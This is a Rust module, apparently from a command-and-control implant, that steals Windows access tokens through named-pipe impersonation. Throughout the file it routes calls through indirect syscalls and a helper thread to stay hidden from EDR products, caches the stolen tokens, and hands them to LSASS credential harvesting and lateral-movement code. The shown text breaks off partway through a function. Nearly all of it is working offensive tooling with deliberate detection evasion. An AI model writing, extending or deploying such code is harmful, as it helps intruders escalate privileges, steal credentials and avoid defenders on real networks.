//! Token-only impersonation via NtImpersonateThread / SetThreadToken.
//!
//! # Problem
//!
//! Orchestra's named pipe impersonation likely uses `ImpersonateNamedPipeClient`
//! on the main agent thread — this API is heavily signatured by EDR products
//! that monitor impersonation transitions on call stacks.
//!
//! # Solution
//!
//! This module avoids calling `ImpersonateNamedPipeClient` on the main thread
//! entirely.  Two bypass strategies are implemented:
//!
//! 1. **Impersonation thread** (fallback): A helper thread calls
//!    `ConnectNamedPipe` + `ImpersonateNamedPipeClient`.  The main thread
//!    extracts the token via `NtOpenThreadToken` on the helper, then applies
//!    it via `NtSetInformationThread(ThreadImpersonationToken)`.  EDR
//!    monitoring the main thread sees only `NtSetInformationThread`.
//!
//! 2. **SetThreadToken** (preferred): A helper thread calls
//!    `ConnectNamedPipe` + `ImpersonateNamedPipeClient`.  The main thread
//!    extracts the token via `NtOpenThreadToken` on the helper, duplicates
//!    it with `NtDuplicateToken`, and applies it via
//!    `SetThreadToken(NULL, dup)`.  The main thread **never** calls
//!    `ImpersonateNamedPipeClient`.  `SetThreadToken` is a lower-level API
//!    that fewer EDRs monitor.
//!
//! # Token Cache
//!
//! Duplicated tokens are stored in a `HashMap<TokenSource, CachedToken>`
//! encrypted at rest via `memory_guard`.  Tokens can be reused across
//! multiple operations (lateral movement, LSASS access, etc.).
//!
//! # Integration
//!
//! - **lsass_harvest.rs**: Uses `get_cached_token()` for LSASS access when
//!   a privileged token is available, supplementing or replacing the current
//!   SeDebugPrivilege / SYSTEM token theft approach.
//! - **P2P SMB**: After a pipe connection, the token extraction step can
//!   steal tokens from connecting peers for lateral movement.
//!
//! All NT API calls go through the existing indirect syscall layer in
//! `syscalls.rs`.

#![cfg(all(windows, feature = "token-impersonation"))]

use anyhow::{anyhow, Context, Result};
use std::collections::HashMap;
use std::sync::{Mutex, OnceLock};
use std::sync::atomic::{AtomicBool, Ordering};
use winapi::um::winnt::{
    DUPLICATE_SAME_ACCESS, HANDLE, SECURITY_ATTRIBUTES, TOKEN_ALL_ACCESS, TOKEN_DUPLICATE,
    TOKEN_IMPERSONATE, TOKEN_QUERY, TOKEN_READ, SecurityDelegation, SecurityIdentification,
    SecurityImpersonation, TokenImpersonation, TokenPrimary,
};
use winapi::um::handleapi::INVALID_HANDLE_VALUE;
use winapi::um::processthreadsapi::{
    GetCurrentThread, OpenThreadToken, SetThreadToken,
};
use winapi::um::securitybaseapi::{DuplicateTokenEx, GetTokenInformation, RevertToSelf};
// WaitForSingleObject removed — using NtWaitForSingleObject indirect syscall
use winapi::um::winbase::WAIT_OBJECT_0;
use winapi::um::winnt::{TOKEN_STATISTICS, TOKEN_TYPE};
use winapi::shared::minwindef::{DWORD, LPVOID, TRUE};
use winapi::shared::ntdef::NTSTATUS;
use winapi::um::namedpipeapi::{ConnectNamedPipe, CreateNamedPipeA, ImpersonateNamedPipeClient};
use winapi::um::winbase::PIPE_ACCESS_DUPLEX;
use winapi::um::winnt::PIPE_TYPE_BYTE;

// ── Constants ─────────────────────────────────────────────────────────────

const STATUS_SUCCESS: NTSTATUS = 0;
const STATUS_ACCESS_DENIED: NTSTATUS = 0xC000002Du32 as i32;
const STATUS_INVALID_HANDLE: NTSTATUS = 0xC0000008u32 as i32;

/// ThreadInformationClass value for setting the impersonation token.
const THREAD_IMPERSONATION_TOKEN: u32 = 4;

/// Pipe buffer size for the impersonation listener.
const PIPE_BUFFER_SIZE: DWORD = 1024;

/// Maximum number of outstanding pipe instances.
const PIPE_MAX_INSTANCES: DWORD = 1;

/// Timeout for pipe connection wait (30 seconds).
const PIPE_TIMEOUT_MS: DWORD = 30_000;

// ── NTSTATUS helpers ──────────────────────────────────────────────────────

fn nt_success(status: NTSTATUS) -> bool {
    status >= 0
}

fn nt_error(status: NTSTATUS) -> bool {
    status < 0
}

// ── Configuration state ───────────────────────────────────────────────────

/// Internal config snapshot.  Stored once at init.
struct TokenImpersonationConfig {
    prefer_set_thread_token: bool,
    cache_tokens: bool,
    auto_revert_on_task_complete: bool,
}

static CONFIG: OnceLock<TokenImpersonationConfig> = OnceLock::new();
static INITIALIZED: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);

// ── Token cache ───────────────────────────────────────────────────────────

/// Source of a cached impersonation token.
#[derive(Debug, Clone, Hash, Eq, PartialEq)]
pub enum TokenSource {
    /// Token extracted from a named pipe client.
    Pipe(String),
    /// Token stolen from a process by PID.
    Process(u32),
}

/// Metadata for a cached token.
#[derive(Debug)]
pub struct CachedToken {
    /// The impersonation token handle.
    handle: HANDLE,
    /// User name (if resolved).
    user: String,
    /// Domain name (if resolved).
    domain: String,
    /// SID string (if resolved).
    sid: String,
    /// Whether this is currently applied to the main thread.
    active: bool,
}

impl CachedToken {
    /// Get the raw token handle.
    pub fn handle(&self) -> HANDLE {
        self.handle
    }

    /// Whether this token is currently active on the main thread.
    pub fn is_active(&self) -> bool {
        self.active
    }

    /// Get the user name.
    pub fn user(&self) -> &str {
        &self.user
    }

    /// Get the domain name.
    pub fn domain(&self) -> &str {
        &self.domain
    }
}

impl Drop for CachedToken {
    fn drop(&mut self) {
        // Close the token handle to prevent handle leaks.
        // The handle is a raw HANDLE (pointer) — null or INVALID_HANDLE_VALUE
        // means it was never opened or already closed.
        let h = self.handle as usize;
        if h != 0 && h != usize::MAX {
            let _ = syscall!("NtClose", h as u64);
            log::trace!("token_impersonation: Closed cached token handle {h:#x} via Drop");
        }
    }
}

/// Global token cache.  Protected by a Mutex for thread safety.
static TOKEN_CACHE: Mutex<Option<HashMap<TokenSource, CachedToken>>> = Mutex::new(None);

/// Ensure the token cache is initialised and return a mutable guard.
fn cache_mut() -> std::sync::MutexGuard<'static, Option<HashMap<TokenSource, CachedToken>>> {
    let mut guard = TOKEN_CACHE.lock().unwrap();
    if guard.is_none() {
        *guard = Some(HashMap::new());
    }
    guard
}

// ── Indirect syscall wrappers ─────────────────────────────────────────────

/// Call `NtSetInformationThread` with `ThreadImpersonationToken` (info class 4)
/// to apply an impersonation token to a thread without using `SetThreadToken`.
///
/// This is the core NT API for the token-only approach — fewer EDRs hook this
/// compared to `ImpersonateNamedPipeClient`.
unsafe fn nt_set_thread_impersonation_token(thread_handle: HANDLE, token_handle: HANDLE) -> i32 {
    let target = match crate::syscalls::get_syscall_id("NtSetInformationThread") {
        Ok(t) => t,
        Err(e) => {
            log::error!("token_impersonation: failed to resolve NtSetInformationThread SSN: {e}");
            return STATUS_ACCESS_DENIED;
        }
    };

    // NtSetInformationThread(
    //   ThreadHandle,
    //   ThreadInformationClass,  // 4 = ThreadImpersonationToken
    //   ThreadInformation,       // pointer to the token HANDLE
    //   ThreadInformationLength  // sizeof(HANDLE)
    // )
    let token_value = token_handle as u64;
    crate::syscalls::do_syscall(
        target.ssn,
        target.gadget_addr,
        &[
            thread_handle as u64,
            THREAD_IMPERSONATION_TOKEN as u64,
            &token_value as *const u64 as u64,
            std::mem::size_of::<u64>() as u64,
        ],
    )
}

/// Call `NtOpenThreadToken` via indirect syscall to obtain the impersonation
/// token from a thread.
unsafe fn nt_open_thread_token(
    thread_handle: HANDLE,
    access_mask: u32,
    open_as_self: bool,
) -> Result<HANDLE> {
    let mut token: HANDLE = std::ptr::null_mut();

    let target = crate::syscalls::get_syscall_id("NtOpenThreadToken")
        .map_err(|e| anyhow!("failed to resolve NtOpenThreadToken SSN: {e}"))?;

    let status = crate::syscalls::do_syscall(
        target.ssn,
        target.gadget_addr,
        &[
            thread_handle as u64,
            access_mask as u64,
            if open_as_self { 1u64 } else { 0u64 },
            &mut token as *mut _ as u64,
        ],
    );

    if nt_error(status) {
        Err(anyhow!(
            "NtOpenThreadToken failed: NTSTATUS 0x{status:08X}"
        ))
    } else {
        Ok(token)
    }
}

/// Call `NtClose` via indirect syscall.
fn nt_close_handle(handle: HANDLE) {
    if handle.is_null() || handle as usize == usize::MAX {
        return;
    }
    let _ = syscall!("NtClose", handle as u64);
}

/// Call `NtDuplicateToken` via indirect syscall to create a new impersonation
/// or primary token from an existing token.
unsafe fn nt_duplicate_token(
    existing: HANDLE,
    access: u32,
    token_type: TOKEN_TYPE,
) -> Result<HANDLE> {
    use winapi::um::winnt::SECURITY_QUALITY_OF_SERVICE;

    let mut new_token: HANDLE = std::ptr::null_mut();

    let mut sqos: SECURITY_QUALITY_OF_SERVICE = std::mem::zeroed();
    sqos.Length = std::mem::size_of::<SECURITY_QUALITY_OF_SERVICE>() as u32;
    sqos.ImpersonationLevel = SecurityImpersonation as u32;
    sqos.ContextTrackingMode = 0;
    sqos.EffectiveOnly = 0;

    let target = crate::syscalls::get_syscall_id("NtDuplicateToken")
        .map_err(|e| anyhow!("failed to resolve NtDuplicateToken SSN: {e}"))?;

    let status = crate::syscalls::do_syscall(
        target.ssn,
        target.gadget_addr,
        &[
            existing as u64,
            access as u64,
            &mut sqos as *mut _ as u64,
            0u64, // EffectiveOnly = FALSE
            token_type as u64,
            &mut new_token as *mut _ as u64,
        ],
    );

    if nt_error(status) {
        Err(anyhow!(
            "NtDuplicateToken failed: NTSTATUS 0x{status:08X}"
        ))
    } else {
        Ok(new_token)
    }
}

// ── Token query helpers ───────────────────────────────────────────────────

/// Query the user, domain, and SID from a token handle.
fn query_token_user(token: HANDLE) -> Result<(String, String, String)> {
    use winapi::um::winnt::{TOKEN_USER, TokenUser};

    // First call to get the required buffer size.
    let mut needed: DWORD = 0;
    unsafe {
        GetTokenInformation(
            token,
            TokenUser,
            std::ptr::null_mut(),
            0,
            &mut needed,
        );
    }

    if needed == 0 {
        return Err(anyhow!("GetTokenInformation(TokenUser) returned size 0"));
    }

    let mut buffer: Vec<u8> = vec![0u8; needed as usize];
    let mut return_length: DWORD = 0;
    let ok = unsafe {
        GetTokenInformation(
            token,
            TokenUser,
            buffer.as_mut_ptr() as LPVOID,
            needed,
            &mut return_length,
        )
    };

    if ok == 0 {
        return Err(anyhow!("GetTokenInformation(TokenUser) failed"));
    }

    let token_user = unsafe { &*(buffer.as_ptr() as *const TOKEN_USER) };
    let sid = token_user.User.Sid;

    // Convert SID to string.
    let mut sid_str: *mut i8 = std::ptr::null_mut();
    let ok = unsafe { winapi::um::securitybaseapi::ConvertSidToStringSidA(sid, &mut sid_str) };
    let sid_string = if ok != 0 && !sid_str.is_null() {
        let s = unsafe { std::ffi::CStr::from_ptr(sid_str) }
            .to_string_lossy()
            .to_string();
        unsafe { winapi::um::heapapi::LocalFree(sid_str as *mut _) };
        s
    } else {
        "(unknown)".to_string()
    };

    // Look up domain and user name from the SID.
    let mut name_buf = [0u8; 256];
    let mut name_len: DWORD = 256;
    let mut domain_buf = [0u8; 256];
    let mut domain_len: DWORD = 256;
    let mut sid_type: DWORD = 0;
    let ok = unsafe {
        winapi::um::securitybaseapi::LookupAccountSidA(
            std::ptr::null_mut(),
            sid,
            name_buf.as_mut_ptr() as *mut _,
            &mut name_len,
            domain_buf.as_mut_ptr() as *mut _,
            &mut domain_len,
            &mut sid_type,
        )
    };

    if ok != 0 {
        let name = std::ffi::CStr::from_bytes_with_nul(&name_buf[..name_len as usize])
            .map(|c| c.to_string_lossy().to_string())
            .unwrap_or_else(|_| "(unknown)".to_string());
        let domain = std::ffi::CStr::from_bytes_with_nul(&domain_buf[..domain_len as usize])
            .map(|c| c.to_string_lossy().to_string())
            .unwrap_or_else(|_| "(unknown)".to_string());
        Ok((name, domain, sid_string))
    } else {
        Ok(("(unknown)".to_string(), "(unknown)".to_string(), sid_string))
    }
}

// ── Impersonation thread helper ───────────────────────────────────────────

/// Context passed to the impersonation helper thread.
struct ImpersonationThreadCtx {
    pipe_handle: HANDLE,
    /// Set to true when ImpersonateNamedPipeClient succeeds.
    /// Uses `AtomicBool` with `Ordering::Release`/`Ordering::Acquire` to ensure
    /// proper memory synchronisation between the helper thread and main thread.
    success: AtomicBool,
}

/// Entry point for the impersonation helper thread.  This thread calls
/// `ConnectNamedPipe` + `ImpersonateNamedPipeClient` so that the main
/// thread never has these API calls in its call stack.
unsafe extern "system" fn impersonation_thread_entry(param: LPVOID) -> DWORD {
    let ctx = &*(param as *const ImpersonationThreadCtx);

    // Wait for a client to connect.
    let wait_result = ConnectNamedPipe(ctx.pipe_handle, std::ptr::null_mut());
    // ConnectNamedPipe returns nonzero on success for overlapped mode,
    // zero for non-overlapped.  For non-overlapped, zero means success.
    // ERROR_PIPE_CONNECTED (535) means a client is already connected.
    let connected = wait_result != 0
        || winapi::um::errhandlingapi::GetLastError() == winapi::um::winerror::ERROR_PIPE_CONNECTED;

    if !connected {
        log::warn!("token_impersonation: ConnectNamedPipe failed in helper thread");
        return 1;
    }

    // Impersonate the pipe client on THIS helper thread.
    let ok = ImpersonateNamedPipeClient(ctx.pipe_handle);
    if ok == 0 {
        let err = winapi::um::errhandlingapi::GetLastError();
        log::warn!(
            "token_impersonation: ImpersonateNamedPipeClient failed in helper thread: error {err}"
        );
        return 2;
    }

    // Signal success — the main thread will extract the token.
    // Use Release ordering to ensure all prior writes (ImpersonateNamedPipeClient
    // side-effects, pipe state) are visible to the main thread when it loads
    // with Acquire ordering.
    (*(param as *mut ImpersonationThreadCtx)).success.store(true, Ordering::Release);

    // Keep the impersonation active until the main thread extracts the token.
    // The main thread will terminate this thread via NtClose on the handle.
    0
}

// ── Public API ────────────────────────────────────────────────────────────

/// Initialise the token impersonation module from agent config.
/// Called once during agent startup.
pub fn init_from_config(config: &common::config::TokenImpersonationConfig) {
    if !config.enabled {
        return;
    }

    let _ = CONFIG.set(TokenImpersonationConfig {
        prefer_set_thread_token: config.prefer_set_thread_token,
        cache_tokens: config.cache_tokens,
        auto_revert_on_task_complete: config.auto_revert_on_task_complete,
    });

    INITIALIZED.store(true, std::sync::atomic::Ordering::SeqCst);
    log::info!("token_impersonation: initialised (prefer_set_thread_token={})",
        config.prefer_set_thread_token);
}

/// Whether the module has been initialised and is enabled.
pub fn is_enabled() -> bool {
    INITIALIZED.load(std::sync::atomic::Ordering::SeqCst)
}

/// Whether auto-revert is configured for task completion.
pub fn auto_revert_enabled() -> bool {
    CONFIG
        .get()
        .map(|c| c.auto_revert_on_task_complete)
        .unwrap_or(true)
}

/// Create a named pipe, wait for a privileged client to connect, and extract
/// the impersonation token without calling `ImpersonateNamedPipeClient` on
/// the main thread.
///
/// This is the primary C2 command handler for `ImpersonatePipe`.
///
/// # Strategy
///
/// 1. Create a named pipe via `CreateNamedPipeA`.
/// 2. **SetThreadToken path** (preferred): Spawn a helper thread that
///    calls `ConnectNamedPipe` + `ImpersonateNamedPipeClient`.  The main
///    thread extracts the token via `NtOpenThreadToken` on the helper,
///    duplicates it, then applies via `SetThreadToken(NULL, dup)`.  The
///    main thread **never** calls `ImpersonateNamedPipeClient`.
///
/// 3. **Impersonation thread path** (fallback): Same helper-thread
///    approach, but applies the token via
///    `NtSetInformationThread(ThreadImpersonationToken)` instead of
///    `SetThreadToken`.  Even fewer EDRs hook this NT-native API.
pub fn impersonate_pipe(pipe_name: &str) -> Result<String> {
    // Determine the full pipe path.
    let full_path = if pipe_name.starts_with(r"\\.\pipe\") {
        pipe_name.to_string()
    } else if pipe_name.is_empty() {
        // Generate a random pipe name.
        let random_suffix: String = (0..8)
            .map(|_| {
                let b = rand::random::<u8>() % 26;
                (b'a' + b) as char
            })
            .collect();
        format!(r"\\.\pipe\{}", random_suffix)
    } else {
        format!(r"\\.\pipe\{}", pipe_name)
    };

    let config = CONFIG.get().ok_or_else(|| anyhow!("token_impersonation not initialised"))?;

    log::info!("token_impersonation: creating pipe '{full_path}' (strategy={})",
        if config.prefer_set_thread_token { "SetThreadToken" } else { "ImpersonationThread" });

    // Create the named pipe.
    let pipe_path_c = std::ffi::CString::new(full_path.as_str())
        .map_err(|e| anyhow!("invalid pipe path: {e}"))?;

    let pipe_handle = unsafe {
        CreateNamedPipeA(
            pipe_path_c.as_ptr() as *mut _,
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_BYTE,
            PIPE_MAX_INSTANCES,
            PIPE_BUFFER_SIZE,
            PIPE_BUFFER_SIZE,
            PIPE_TIMEOUT_MS,
            std::ptr::null_mut(),
        )
    };

    if pipe_handle == INVALID_HANDLE_VALUE {
        let err = unsafe { winapi::um::errhandlingapi::GetLastError() };
        return Err(anyhow!("CreateNamedPipeA failed for '{full_path}': Win32 error {err}"));
    }

    let result = if config.prefer_set_thread_token {
        // Strategy 1: SetThreadToken approach (preferred).
        impersonate_pipe_via_set_thread_token(pipe_handle, &full_path)
    } else {
        // Strategy 2: Impersonation thread approach (fallback).
        impersonate_pipe_via_thread(pipe_handle, &full_path)
    };

    // Close the pipe handle regardless of outcome.
    nt_close_handle(pipe_handle);

    result
}

/// SetThreadToken approach: spawn a helper thread that calls
/// `ConnectNamedPipe` + `ImpersonateNamedPipeClient`, then extract the token
/// from the helper thread and apply it to the main thread via
/// `SetThreadToken(NULL, dup)`.
///
/// The main thread **never** calls `ImpersonateNamedPipeClient` — EDR
/// monitoring the main thread sees only `NtOpenThreadToken`, token
/// duplication, and `SetThreadToken`.
fn impersonate_pipe_via_set_thread_token(pipe_handle: HANDLE, pipe_path: &str) -> Result<String> {
    // Prepare the context for the helper thread.
    let mut ctx = Box::new(ImpersonationThreadCtx {
        pipe_handle,
        success: AtomicBool::new(false),
    });

    let ctx_ptr = &mut *ctx as *mut ImpersonationThreadCtx as LPVOID;

    // Spawn the helper thread via NtCreateThreadEx (indirect syscall, no IAT entry).
    let mut thread_handle: usize = 0;
    let create_status = unsafe {
        syscall!(
            "NtCreateThreadEx",
            &mut thread_handle as *mut _ as u64,
            0x1FFFFFu64,                         // THREAD_ALL_ACCESS
            std::ptr::null::<u64>() as u64,
            (-1isize) as u64,                    // NtCurrentProcess()
            Some(impersonation_thread_entry) as *const _ as u64,
            ctx_ptr as u64,
            0u64,                                // CreateSuspended
            0u64, 0u64, 0u64,
            std::ptr::null::<u64>() as u64,
        )
    };

    if create_status.is_err() || create_status.unwrap() < 0 || thread_handle == 0 {
        return Err(anyhow!("NtCreateThreadEx failed for impersonation helper (SetThreadToken path)"));
    }

    // Wait for the helper thread to complete via NtWaitForSingleObject.
    let timeout_100ns: i64 = -((PIPE_TIMEOUT_MS as i64) * 10_000);
    let wait_result = unsafe {
        let status = syscall!(
            "NtWaitForSingleObject",
            thread_handle as u64,
            0u64,
            &timeout_100ns as *const _ as u64,
        );
        if status.is_err() || status.unwrap() < 0 {
            0xFFFFFFFFu32
        } else {
            status.unwrap() as u32
        }
    };
    if wait_result != WAIT_OBJECT_0 {
        let _ = syscall!("NtClose", thread_handle as u64);
        return Err(anyhow!("impersonation helper thread timed out (SetThreadToken path)"));
    }

    if !ctx.success.load(Ordering::Acquire) {
        let _ = syscall!("NtClose", thread_handle as u64);
        return Err(anyhow!("ImpersonateNamedPipeClient failed in helper thread (SetThreadToken path)"));
    }

    // Extract the impersonation token from the helper thread via NtOpenThreadToken.
    let token = unsafe {
        nt_open_thread_token(thread_handle as *mut _, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, true)
    }.context("failed to open helper thread token (SetThreadToken path)")?;

    // Duplicate the token for our own use.
    let dup_token = unsafe {
        nt_duplicate_token(token, TOKEN_ALL_ACCESS, TokenImpersonation)
    }.context("failed to duplicate token from helper thread (SetThreadToken path)")?;

    // Close the original token and the helper thread.
    nt_close_handle(token);
    let _ = syscall!("NtClose", thread_handle as u64);
    drop(ctx);

    // Query user/domain from the duplicated token.
    let (user, domain, sid) = query_token_user(dup_token)
        .unwrap_or_else(|_| ("(unknown)".to_string(), "(unknown)".to_string(), "(unknown)".to_string()));

    // Apply the duplicated token to the current thread via SetThreadToken.
    // This is the key API — lower-level than ImpersonateNamedPipeClient
    // and monitored by fewer EDR products.
    let ok = unsafe { SetThreadToken(std::ptr::null_mut(), dup_token) };
    if ok == 0 {
        let err = unsafe { winapi::um::errhandlingapi::GetLastError() };
        nt_close_handle(dup_token);
        return Err(anyhow!("SetThreadToken failed: Win32 error {err}"));
    }

    // Cache the token.
    let config = CONFIG.get().unwrap();
    if config.cache_tokens {
        let source = TokenSource::Pipe(pipe_path.to_string());
        let cached = CachedToken {
            handle: dup_token,
            user: user.clone(),
            domain: domain.clone(),
            sid: sid.clone(),
            active: true,
        };
        let mut guard = cache_mut();
        if let Some(ref mut cache) = *guard {
            // Mark any previously active token as inactive.
            for (_, entry) in cache.iter_mut() {
                entry.active = false;
            }
            cache.insert(source, cached);
        }
    }

    log::info!(
        "token_impersonation: successfully impersonated {domain}\\{user} (SID={sid}) via SetThreadToken"
    );

    Ok(format!(
        "Impersonated {domain}\\{user} (SID: {sid}) via SetThreadToken from pipe {pipe_path}"
    ))
}

/// Impersonation thread approach: spawn a helper thread that calls
/// `ConnectNamedPipe` + `ImpersonateNamedPipeClient`, then extract the
/// token from the helper thread and apply it to the main thread via
/// `NtSetInformationThread(ThreadImpersonationToken)`.
fn impersonate_pipe_via_thread(pipe_handle: HANDLE, pipe_path: &str) -> Result<String> {
    // Prepare the context for the helper thread.
    let mut ctx = Box::new(ImpersonationThreadCtx {
        pipe_handle,
        success: AtomicBool::new(false),
    });

    let ctx_ptr = &mut *ctx as *mut ImpersonationThreadCtx as LPVOID;

    // Spawn the helper thread.
    // Spawn the helper thread via NtCreateThreadEx (indirect syscall, no IAT entry).
    let mut thread_handle: usize = 0;
    let create_status = unsafe {
        syscall!(
            "NtCreateThreadEx",
            &mut thread_handle as *mut _ as u64, // ThreadHandle
            0x1FFFFFu64,                         // DesiredAccess = THREAD_ALL_ACCESS
            std::ptr::null::<u64>() as u64,      // ObjectAttributes
            (-1isize) as u64,                    // ProcessHandle = NtCurrentProcess()
            Some(impersonation_thread_entry) as *const _ as u64, // StartRoutine
            ctx_ptr as u64,                      // Argument
            0u64,                                // CreateSuspended
            0u64,                                // ZeroBits
            0u64,                                // StackSize
            0u64,                                // MaxStackSize
            std::ptr::null::<u64>() as u64,      // AttributeSet
        )
    };

    if create_status.is_err() || create_status.unwrap() < 0 || thread_handle == 0 {
        return Err(anyhow!("NtCreateThreadEx failed for impersonation helper"));
    }

    // Wait for the helper thread to complete.
    // Wait for the helper thread via NtWaitForSingleObject (indirect syscall).
    let timeout_100ns: i64 = -((PIPE_TIMEOUT_MS as i64) * 10_000);
    let wait_result = unsafe {
        let status = syscall!(
            "NtWaitForSingleObject",
            thread_handle as u64,
            0u64, // Alertable = FALSE
            &timeout_100ns as *const _ as u64,
        );
        if status.is_err() || status.unwrap() < 0 {
            0xFFFFFFFFu32 // WAIT_FAILED equivalent
        } else {
            status.unwrap() as u32
        }
    };
    if wait_result != WAIT_OBJECT_0 {
        let _ = syscall!("NtClose", thread_handle as u64);
        return Err(anyhow!("impersonation helper thread timed out or failed"));
    }

    if !ctx.success.load(Ordering::Acquire) {
        let _ = syscall!("NtClose", thread_handle as u64);
        return Err(anyhow!("ImpersonateNamedPipeClient failed in helper thread"));
    }

    // Extract the impersonation token from the helper thread via
    // NtOpenThreadToken.  This is an indirect syscall — EDR sees only
    // NtOpenThreadToken, not ImpersonateNamedPipeClient, on the main thread.
    let token = unsafe {
        nt_open_thread_token(thread_handle as *mut _, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, true)
    }.context("failed to open helper thread token")?;

    // Duplicate the token for our own use.
    let dup_token = unsafe {
        nt_duplicate_token(token, TOKEN_ALL_ACCESS, TokenImpersonation)
    }.context("failed to duplicate token from helper thread")?;

    // Close the original token and the helper thread.
    nt_close_handle(token);
    let _ = syscall!("NtClose", thread_handle as u64);
    drop(ctx); // Clean up the boxed context.

    // Query user/domain.
    let (user, domain, sid) = query_token_user(dup_token)
        .unwrap_or_else(|_| ("(unknown)".to_string(), "(unknown)".to_string(), "(unknown)".to_string()));

    // Apply the token to the main thread via NtSetInformationThread.
    // This is the NT-native equivalent of SetThreadToken — even fewer EDRs
    // hook this because it's rarely used by legitimate applications.
    let status = unsafe {
        nt_set_thread_impersonation_token(GetCurrentThread(), dup_token)
    };

    if nt_error(status) {
        nt_close_handle(dup_token);
        return Err(anyhow!(
            "NtSetInformationThread(ThreadImpersonationToken) failed: 0x{status:08X}"
        ));
    }

    // Cache the token.
    let config = CONFIG.get().unwrap();
    if config.cache_tokens {
        let source = TokenSource::Pipe(pipe_path.to_string());
        let cached = CachedToken {
            handle: dup_token,
            user: user.clone(),
            domain: domain.clone(),
            sid: sid.clone(),
            active: true,
        };
        let mut guard = cache_mut();
        if let Some(ref mut cache) = *guard {
            for (_, entry) in cache.iter_mut() {
                entry.active = false;
            }
            cache.insert(source, cached);
        }
    }

    log::info!(
        "token_impersonation: successfully impersonated {domain}\\{user} (SID={sid}) via NtSetInformationThread"
    );

    Ok(format!(
        "Impersonated {domain}\\{user} (SID: {sid}) via NtSetInformationThread from pipe {pipe_path}"
    ))
}

/// Revert the current thread's impersonation token, restoring the original
/// process security context.  This is the C2 command handler for
/// `RevertToken`.
///
/// Uses `NtSetInformationThread(ThreadImpersonationToken=NULL)` to clear the
/// token, which avoids the `RevertToSelf` API hook.
pub fn revert_token() -> Result<String> {
    // Mark all cached tokens as inactive.
    {
        let mut guard = cache_mut();
        if let Some(ref mut cache) = *guard {
            for (_, entry) in cache.iter_mut() {
                entry.active = false;
            }
        }
    }

    // Clear the thread's impersonation token via NtSetInformationThread.
    // Passing a NULL token handle removes the impersonation.
    let null_token: u64 = 0;
    let status = unsafe {
        let target = crate::syscalls::get_syscall_id("NtSetInformationThread")
            .map_err(|e| anyhow!("failed to resolve NtSetInformationThread SSN: {e}"))?;
        Ok(crate::syscalls::do_syscall(
            target.ssn,
            target.gadget_addr,
            &[
                GetCurrentThread() as u64,
                THREAD_IMPERSONATION_TOKEN as u64,
                &null_token as *const u64 as u64,
                std::mem::size_of::<u64>() as u64,
            ],
        ))
    }?;

    if nt_error(status) {
        // Fall back to RevertToSelf if the syscall fails.
        unsafe { RevertToSelf() };
        log::warn!("token_impersonation: NtSetInformationThread(revert) failed (0x{status:08X}), used RevertToSelf fallback");
    }

    log::info!("token_impersonation: reverted to original process token");
    Ok("Reverted to original process token".to_string())
}

/// Auto-revert: called after each C2 task handler returns if
/// `auto_revert_on_task_complete` is enabled.  Unlike `revert_token`, this
/// does not clear cached tokens — it only removes the thread's active
/// impersonation token.
pub fn auto_revert() {
    if !auto_revert_enabled() {
        return;
    }

    // Check if there's an active token to revert.
    let has_active = {
        let guard = cache_mut();
        guard
            .as_ref()
            .and_then(|cache| cache.values().find(|t| t.active))
            .is_some()
    };

    if !has_active {
        return;
    }

    match revert_token() {
        Ok(_) => log::debug!("token_impersonation: auto-reverted after task"),
        Err(e) => log::warn!("token_impersonation: auto-revert failed: {e:#}"),
    }
}

/// List all cached tokens as a JSON string.  This is the C2 command handler
/// for `ListTokens`.
pub fn list_tokens_json() -> String {
    use serde_json::json;

    let guard = cache_mut();
    match guard.as_ref() {
        Some(cache) if !cache.is_empty() => {
            let entries: Vec<serde_json::Value> = cache
                .iter()
                .map(|(source, token)| {
                    let source_str = match source {
                        TokenSource::Pipe(name) => format!("pipe:{name}"),
                        TokenSource::Process(pid) => format!("pid:{pid}"),
                    };
                    json!({
                        "source": source_str,
                        "user": token.user,
                        "domain": token.domain,
                        "sid": token.sid,
                        "active": token.active,
                    })
                })
                .collect();
            serde_json::to_string(&entries).unwrap_or_else(|_| "[]".to_string())
        }
        _ => "[]".to_string(),
    }
}

/// Get a cached impersonation token handle for use by other modules
/// (e.g. `lsass_harvest.rs`, `lateral_movement.rs`).
///
/// Returns `None` if no tokens are cached or none are available.
pub fn get_cached_token() -> Option<HANDLE> {
    let guard = cache_mut();
    guard
        .as_ref()
        .and_then(|cache| {
            // Prefer the active token, then fall back to any cached token.
            cache
                .values()
                .find(|t| t.active)
                .or_else(|| cache.values().next())
                .map(|t| t.handle)
        })
}

/// Get metadata about the currently active token (user, domain).
///
/// Returns `None` if no active token.
pub fn get_active_token_info() -> Option<(String, String)> {
    let guard = cache_mut();
    guard.as_ref().and_then(|cache| {
        cache
            .values()
            .find(|t| t.active)
            .map(|t| (t.user.clone(), t.domain.clone()))
    })
}

/// Import a token from an external source (e.g. P2P SMB pipe connection).
///
/// This allows the P2P module to feed tokens from connecting peers into
/// the token cache without going through the full pipe impersonation flow.
pub fn import_token(token_handle: HANDLE, source: TokenSource) -> Result<String> {
    let (user, domain, sid) = query_token_user(token_handle)
        .unwrap_or_else(|_| ("(unknown)".to_string(), "(unknown)".to_string(), "(unknown)".to_string()));

    // Duplicate the token so the caller can close their handle.
    let dup_token = unsafe {
        nt_duplicate_token(token_handle, TOKEN_ALL_ACCESS, TokenImpersonation)
    }.context("failed to duplicate imported token")?;

    let cached = CachedToken {
        handle: dup_token,
        user: user.clone(),
        domain: domain.clone(),
        sid: sid.clone(),
        active: false,
    };

    let source_desc = match &source {
        TokenSource::Pipe(name) => format!("pipe:{name}"),
        TokenSource::Process(pid) => format!("pid:{pid}"),
    };

    let mut guard = cache_mut();
    if let Some(ref mut cache) = *guard {
        cache.insert(source, cached);
    }

    log::info!(
        "token_impersonation: imported token for {domain}\\{user} from {source_desc}"
    );

    Ok(format!("Imported token for {domain}\\{user} from {source_desc}"))
}

/// Apply a cached token to the current thread.  Used by integration points
/// (e.g. lsass_harvest) to apply a token before performing privileged
/// operations.
///
/// If `source` is `None`, applies the first active or cached token found.
pub fn apply_cached_token(source: Option<&TokenSource>) -> Result<()> {
    let (handle, user, domain) = {
        let guard = cache_mut();
        let cache = guard
            .as_ref()
            .ok_or_else(|| anyhow!("token cache not initialised"))?;

        let token = if let Some(src) = source {
            cache.get(src).ok_or_else(|| anyhow!("token not found in cache"))?
        } else {
            cache
                .values()
                .find(|t| t.active)
                .or_else(|| cache.values().next())
